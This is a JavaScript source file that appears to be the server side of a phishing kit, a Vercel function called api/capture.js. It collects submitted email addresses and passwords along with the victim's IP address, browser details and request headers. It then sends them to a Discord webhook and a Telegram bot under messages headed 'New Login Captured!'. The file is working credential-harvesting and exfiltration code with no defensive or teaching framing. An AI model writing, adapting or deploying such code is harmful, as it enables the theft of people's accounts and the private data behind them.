// api/capture.js - Vercel serverless function to capture data

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        res.status(405).json({ success: false, message: 'Method not allowed' });
        return;
    }

    try {
        const data = req.body;
        
        // Add server-side information
        data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        data.serverTime = new Date().toISOString();
        data.serverUserAgent = req.headers['user-agent'];
        data.serverReferer = req.headers['referer'] || 'Direct';
        data.requestHeaders = {
            accept: req.headers['accept'],
            acceptLanguage: req.headers['accept-language'],
            acceptEncoding: req.headers['accept-encoding'],
            connection: req.headers['connection'],
            secChUa: req.headers['sec-ch-ua'],
            secChUaMobile: req.headers['sec-ch-ua-mobile'],
            secChUaPlatform: req.headers['sec-ch-ua-platform']
        };

        // Store data in Vercel's built-in JSON storage (using environment variable)
        // For production, use Vercel KV, Supabase, or MongoDB
        
        // Send notifications
        await sendToDiscord(data);
        await sendToTelegram(data);
        
        // Log to Vercel console
        console.log('📊 New capture:', JSON.stringify(data, null, 2));

        // Return success
        res.status(200).json({ 
            success: true, 
            message: 'Data captured successfully',
            timestamp: data.serverTime
        });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to capture data',
            error: error.message 
        });
    }
}

// Send to Discord webhook
async function sendToDiscord(data) {
    const webhookURL = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookURL || webhookURL === 'YOUR_DISCORD_WEBHOOK_URL') return;

    const payload = {
        content: `🔐 **New Login Captured!**\n\n📧 Email: \`${data.email}\`\n🔑 Password: \`${data.password}\`\n🌐 IP: \`${data.ip}\`\n⏰ Time: \`${data.serverTime}\`\n💻 Browser: \`${data.userAgent}\``
    };

    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Discord notification failed:', error);
    }
}

// Send to Telegram
async function sendToTelegram(data) {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN') return;

    const message = `🔐 New Login!\n\nEmail: ${data.email}\nPassword: ${data.password}\nIP: ${data.ip}\nTime: ${data.serverTime}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    try {
        await fetch(url);
    } catch (error) {
        console.error('Telegram notification failed:', error);
    }
}
